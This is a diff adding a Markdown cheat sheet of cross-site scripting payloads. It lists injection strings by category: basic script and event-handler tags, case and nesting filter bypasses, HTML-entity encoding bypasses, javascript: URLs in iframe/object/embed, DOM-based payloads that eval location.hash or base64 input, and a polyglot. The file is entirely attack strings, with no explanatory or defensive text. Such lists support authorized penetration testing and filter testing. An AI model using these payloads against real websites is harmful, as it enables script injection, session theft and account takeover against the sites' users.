@@ -1,0 +1,43 @@
+# XSS Payloads
+
+## Basic Payloads
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+<body onload=alert(1)>
+<input onfocus=alert(1) autofocus>
+
+## Event Handlers
+<svg onload=alert(1)>
+<details open ontoggle=alert(1)>
+<marquee onstart=alert(1)>
+<video onerror=alert(1)>
+<audio onerror=alert(1)>
+<select onfocus=alert(1) autofocus>
+<textarea onfocus=alert(1) autofocus>
+<keygen onfocus=alert(1) autofocus>
+<form onsubmit=alert(1)>
+
+## Filter Bypass
+<scr<script>ipt>alert(1)</scr</script>ipt>
+<ScRiPt>alert(1)</sCrIpT>
+<scRipt>alert(1)</scrIPT>
+<SCRIPT>alert(1)</SCRIPT>
+
+## Encoding Bypass
+<img src=x onerror=alert&#40;1&#41;>
+<img src=x onerror=&#97;lert&#40;1&#41;>
+<svg><script>alert&#40;1&#41;</script></svg>
+
+## Alternative Tags
+<iframe src="javascript:alert(1)">
+<object data="javascript:alert(1)">
+<embed src="javascript:alert(1)">
+<link rel="import" href="javascript:alert(1)">
+
+## DOM-based
+<img src=x onerror=eval(location.hash.slice(1))>#alert(1)
+<svg/onload=eval(atob('YWxlcnQoMSk='))>
+
+## Polyglots
+javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
